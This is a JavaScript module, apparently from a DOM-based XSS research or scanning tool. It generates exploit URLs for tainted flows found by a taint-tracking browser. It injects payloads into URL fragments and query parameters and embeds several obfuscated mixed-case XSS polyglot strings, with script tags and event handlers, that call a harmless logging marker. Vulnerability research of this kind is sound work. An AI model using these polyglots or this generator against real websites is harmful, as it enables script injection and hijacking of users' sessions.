(function (global) {
  "use strict";
  // Private modules
  var payloadGen = require("./payload-generator.js");
  const transformer = require("./transformer");

  // node modules
  const { v4: uuidv4 } = require("uuid");

  function generateUrl(finding, taint, setting) {
    console.log("-> Generating url");

    const uuidA = uuidv4();
    const uuidB = uuidv4();
    const uuidC = uuidv4();
    const uuidD = uuidv4();
    const uuidE = uuidv4();
    const uuidF = uuidv4();
    const uuidG = uuidv4();
    const uuidH = uuidv4();
    const uuidI = uuidv4();
    const uuidJ = uuidv4();
    const uuidK = uuidv4();
    const uuidM = uuidv4();
    const uuidN = uuidv4();

    var exploits = {
      methodA: [
        {
          uuid: uuidA,
          url: exploitByMethodA(finding.location, taint, setting, uuidA),
          settings: setting,
        },
      ],
      methodB: [
        {
          uuid: uuidB,
          url: exploitByMethodB(finding.location, taint, setting, uuidB),
          settings: setting,
        },
      ],
      methodC: [
        {
          uuid: uuidC,
          url: exploitByMethodC(finding.location, taint, setting, uuidC),
          settings: setting,
        },
      ],
      methodD: [
        {
          uuid: uuidD,
          url: exploitByMethodD(finding.location, taint, setting, uuidD),
          settings: setting,
        },
      ],
      methodE: [
        {
          uuid: uuidE,
          url: exploitByMethodE(finding.location, taint, setting, uuidE),
          settings: setting,
        },
      ],
      methodF: [
        {
          uuid: uuidF,
          url: exploitByMethodF(finding.location, taint, setting, uuidF),
          settings: setting,
        },
      ],
      methodG: [
        {
          uuid: uuidG,
          url: exploitByMethodG(finding.location, taint, setting, uuidG),
          settings: setting,
        },
      ],
      methodH: [
        {
          uuid: uuidH,
          url: exploitByMethodH(finding.location, taint, setting, uuidH),
          settings: setting,
        },
      ],
      methodI: [
        {
          uuid: uuidI,
          url: exploitByMethodI(finding.location, taint, setting, uuidI),
          settings: setting,
        },
      ],
      methodJ: [
        {
          uuid: uuidJ,
          url: exploitByMethodJ(finding.location, taint, setting, uuidJ),
          settings: setting,
        },
      ],
      methodK: [
        {
          uuid: uuidK,
          url: exploitByMethodK(finding.location, taint, setting, uuidK),
          settings: setting,
        },
      ],
      methodM: [
        {
          uuid: uuidM,
          url: exploitByMethodM(finding.location, taint, setting, uuidM),
          settings: setting,
        },
      ],
      methodN: [
        {
          uuid: uuidN,
          url: exploitByMethodN(finding.location, taint, setting, uuidN),
          settings: setting,
        },
      ],
    };

    return exploits;
  }

  function replaceSequence(url, setting, sequence) {
    return (
      url.substring(0, setting.replaceBeginURL) +
      sequence +
      url.substring(setting.replaceEndURL, url.length)
    );
  }

  function appendSequence(url, sequence) {
    return url + sequence;
  }

  function buildSequence(setting, payload, enterScript) {
    let enter = enterScript ? setting.enterScript : "";
    let inbreak = enterScript ? setting.inBreak : setting.inBreak.slice(1);
    if (setting.replaceBeginURL === setting.replaceEndURL && !setting.outBreak.startsWith("#")) {
      return "#" + setting.outBreak + enter + payload + inbreak;
    } else {
      return setting.outBreak + enter + payload + inbreak;
    }
  }

  function getSequenceStatic(taint, setting, uuid, payload_gen) {
    var payload = payload_gen(uuid);
    // console.log("payload: " + payload);
    const sequence = setting.replaceBeginURL === setting.replaceEndURL ? `#${payload}` : payload;
    return transformer.reverseFunctions(taint, sequence);
  }

  function getSequence(taint, setting, uuid, payload, enterScript) {
    // console.log("payload: " + payload);
    const sequence = buildSequence(setting, payload, enterScript);
    return transformer.reverseFunctions(taint, sequence);
  }

  // generating exploits for method A
  function exploitByMethodA(url, taint, setting, uuid) {
    let payload = payloadGen.getPayload(uuid);
    let sequence = getSequence(taint, setting, uuid, payload, true);
    let newSequence = sequence.indexOf("#") !== 0 ? "#" + sequence : sequence;
    return url + newSequence;
  }

  // generating exploits for method B
  function exploitByMethodB(url, taint, setting, uuid) {
    let payload = payloadGen.getPayload(uuid);
    let sequence = getSequence(taint, setting, uuid, payload, true);
    const beginQueryParams = url.indexOf("?") + 1;
    const endQueryParams = url.indexOf("#") < 0 ? url.length : url.indexOf("#");
    const taintedPart = url.substring(
      setting.beginTaintURL,
      setting.endTaintURL
    );

    if (beginQueryParams < 1) {
      return null;
    } else if (
      setting.beginTaintURL < beginQueryParams ||
      setting.endTaintURL > endQueryParams
    ) {
      return null;
    } else if (taintedPart.indexOf("=") >= 0 || taintedPart.indexOf("&") >= 0) {
      return null;
    } else {
      // split the url
      const location = new URL(url);
      const baseURL =
        url.indexOf("?") >= 0 ? url.substring(0, url.indexOf("?")) : url;
      const fragment = location.hash;
      let searchParams = location.search;

      // extract the parameter
      const beginParamIndex = getBeginParamIndex(
        searchParams,
        setting.beginTaintURL - baseURL.length
      );
      const endParamIndex = getEndParamIndex(
        searchParams,
        setting.endTaintURL - baseURL.length
      );
      const stringParamRaw = searchParams.substring(
        beginParamIndex,
        endParamIndex
      );

      // remove it from url
      searchParams =
        searchParams[beginParamIndex - 1] === "?"
          ? searchParams.substring(0, beginParamIndex) +
            searchParams.substring(endParamIndex, searchParams.length)
          : searchParams.substring(0, beginParamIndex - 1) +
            searchParams.substring(endParamIndex, searchParams.length);

      // append the param with sequence
      let stringParamInjected =
        sequence[0] === "#"
          ? stringParamRaw.substring(0, stringParamRaw.indexOf("=") + 1) +
            sequence.substring(1)
          : stringParamRaw.substring(0, stringParamRaw.indexOf("=") + 1) +
            sequence;

      stringParamInjected =
        fragment === ""
          ? "#&" + stringParamInjected
          : "&" + stringParamInjected;

      // append the url
      return baseURL + searchParams + fragment + stringParamInjected;
    }
  }

  function exploitByMethodC(url, taint, setting, uuid) {
    let payload = payloadGen.getPayload(uuid);
    let sequence = getSequence(taint, setting, uuid, payload, true);
    if (setting.replaceBeginURL !== setting.replaceEndURL)
      return replaceSequence(url, setting, sequence);
    else if (setting.replaceBeginURL === setting.replaceEndURL)
      return appendSequence(url, sequence);
    else return null;
  }

  function exploitByPolyglot(url, taint, setting, uuid, generator) {
    let sequence = getSequenceStatic(taint, setting, uuid, generator);
    if (setting.replaceBeginURL !== setting.replaceEndURL)
      return replaceSequence(url, setting, sequence);
    else if (setting.replaceBeginURL === setting.replaceEndURL)
      return appendSequence(url, sequence);
    else return null;
  }

  function exploitByMethodD(url, taint, setting, uuid) {
    let polyglotPayloadGen = function(uuid) {
      let call = `taintfoxLog('${uuid.replace(/-/g, "")}')`;
      return "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk="+call+" )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd="+call+"//>\x3e";
    };
    return exploitByPolyglot(url, taint, setting, uuid, polyglotPayloadGen);
  }
  function exploitByMethodE(url, taint, setting, uuid) {
    let polyglotPayloadGen = function(uuid) {
      let call = `taintfoxLog('${uuid.replace(/-/g, "")}')`;
      return "jAvAsCRiPt:"+call+"//</bUtTon/</nOeMbed/</sCrIpt//*/*-/*`/*`/*'/*\"/**/<iMg/<iMg/src=1/oNeRrOr="+call+"//>></nOeMbed//**/</StYle/</StYle/</auDio/</StYle/</texTarEa/>(<sTyLe/oNLoAd="+call+"><!--/**//*</bUtTon/</teMplAte/</ifRaMe/</nOeMbed/--!></sOurCe/</tITle/</StYle/><ScRiPt>"+call+"</ScRiPt>";
    };
    return exploitByPolyglot(url, taint, setting, uuid, polyglotPayloadGen);
  }
  function exploitByMethodF(url, taint, setting, uuid) {
    let polyglotPayloadGen = function(uuid) {
      let call = `taintfoxLog('${uuid.replace(/-/g, "")}')`;
return "/* `<ScRiPt>"+call+"</ScRiPt></teMplAte/</viDeO/</iNpUt/</sVg/--></sVg/</frAmEsEt/>,</sVg/</nOeMbed/</teMplAte/</noScRIpt/</noScRIpt/</tITle/>/* /* sRc=/*;</bUtTon/</ifRaMe/><sTyLe/oNLoAd="+call+">%0aoNeRrOr="+call+"//*/OnBlUr="+call+"//";
    };
    return exploitByPolyglot(url, taint, setting, uuid, polyglotPayloadGen);
  }
  function exploitByMethodG(url, taint, setting, uuid) {
    let polyglotPayloadGen = function(uuid) {
      let call = `taintfoxLog('${uuid.replace(/-/g, "")}')`;
      return "'\"<ScRiPt>"+call+"</ScRiPt>nOfRaMeS><ScRiPt>"+call+"</ScRiPt> xMp>-/*'//*<ScRiPt>"+call+"</ScRiPt>> onClICk="+call+" texTarEa>texTarEa>/hTmL>&gt;' oNeRrOr=;xMp>a>sCrIpT`xMp> oNFoCus=)*<!--bUtTon> nOfRaMeS>hTmL>-->"+call+">;&gt;bUtTon&gt;/sOurCe&gt; iMg OnBlUr=, onClICk=/*/*";
    };
    return exploitByPolyglot(url, taint, setting, uuid, polyglotPayloadGen);
  }
  function exploitByMethodH(url, taint, setting, uuid) {
    let polyglotPayloadGen = function(uuid) {
      let call = `taintfoxLog('${uuid.replace(/-/g, "")}')`;
      return "jAvAsCRiPt:"+call+"//><sTyLe/oNLoAd="+call+"></StYle/</bUtTon/</teMplAte/</teMplAte/</sCrIpt/</a/</texTarEa/</bUtTon/</viDeO/</iNpUt//**/oNeRrOr=foRmaCtIoN=*/</a/>(/*hReF=*/--!>`<sCrIpT>"+call+"</sCrIpT></texTarEa/</sOurCe/";
    };
    return exploitByPolyglot(url, taint, setting, uuid, polyglotPayloadGen);
  }
  function exploitByMethodI(url, taint, setting, uuid) {
    let polyglotPayloadGen = function(uuid) {
      let call = `taintfoxLog('${uuid.replace(/-/g, "")}')`;
      return "/*-/*`/*`/*'/*\"/**//*` %0d<sTyLe/oNLoAd="+call+">/*-/*`/*`/*'/*\"/**/oNLoAd="+call+"///**//*'<>&lt;</StYle/</iNpUt/--></sCrIpt/</a/</iNpUt/</noScRIpt//*</auDio/</ifRaMe/</frAmEsEt/</ifRaMe/</noScRIpt/</tITle/></ifRaMe/</sCrIpt/</a/</StYle/</nOeMbed/</viDeO/</nOeMbed//**/oNtOggle=*/pOsTer=/**//<!--</viDeO/</ifRaMe/</sVg/</sOurCe/";
    };
    return exploitByPolyglot(url, taint, setting, uuid, polyglotPayloadGen);
  }
  function exploitByMethodJ(url, taint, setting, uuid) {
    let polyglotPayloadGen = function(uuid) {
      let call = `taintfoxLog('${uuid.replace(/-/g, "")}')`;
      return "</noScRIpt/></auDio/</noScRIpt/</ifRaMe/</tITle/</bUtTon/</texTarEa/</a/</a/>*//**/</teMplAte/</noScRIpt/</auDio/</nOeMbed/>/**/</tITle/</tITle/</teMplAte/</sVg/</iNpUt/-->,<sCrIpT>"+call+"</sCrIpT>/*`>&lt;OnAuxClicK="+call+"//oNmOuseLeaVe=OnAuxClicK=/**/</sOurCe/";
    };
    return exploitByPolyglot(url, taint, setting, uuid, polyglotPayloadGen);
  }

  function exploitByMethodK(url, taint, setting, uuid) {
    let polyglotPayloadGen = function(uuid) {
      let call = `taintfoxLog('${uuid.replace(/-/g, "")}')`;
      return "sTyLe/oNloAd="+call+" <sCrIpt>"+call+"</sCrIpt><sTyLe/oNloAd="+call+"></iframe><sCrIpt>"+call+"</sCrIpt>/</tEmplAte></nosCrIpt><sCrIpt>"+call+"</sCrIpt>0"+uuid+"-->/*-/*`/*`/*'/*\"/**//*</noEmbEd>";
    };
    return exploitByPolyglot(url, taint, setting, uuid, polyglotPayloadGen);
  }

  function exploitByMethodN(url, taint, setting, uuid) {
    let polyglotPayloadGen = function(uuid) {
      return `<taintfox>${uuid.replace(/-/g, "")}</taintfox>`;
    };
    let payload = polyglotPayloadGen(uuid);
    let sequence = getSequence(taint, setting, uuid, payload, false);
    if (setting.replaceBeginURL !== setting.replaceEndURL)
      return replaceSequence(url, setting, sequence);
    else if (setting.replaceBeginURL === setting.replaceEndURL)
      return appendSequence(url, sequence);
    else return null;
  }

  function exploitByMethodM(url, taint, setting, uuid) {
    let polyglotPayloadGen = function(uuid) {
      return `<div data-tf="${uuid.replace(/-/g, "")}"></div>`;
    };
    let payload = polyglotPayloadGen(uuid);
    let sequence = getSequence(taint, setting, uuid, payload, false);
    if (setting.replaceBeginURL !== setting.replaceEndURL)
      return replaceSequence(url, setting, sequence);
    else if (setting.replaceBeginURL === setting.replaceEndURL)
      return appendSequence(url, sequence);
    else return null;
  }

  function getBeginParamIndex(search, taintBegin) {
    for (var i = taintBegin; i >= 0; i--) {
      if (search[i] === "?" || search[i] === "&") return i + 1;
    }
    return null;
  }

  function getEndParamIndex(search, taintEnd) {
    for (var i = taintEnd; i < search.length; i++) {
      if (search[i] === "&" || search[i] === "#") return i;
    }
    return search.length + 1;
  }

  global.generateUrl = generateUrl;
})(exports);
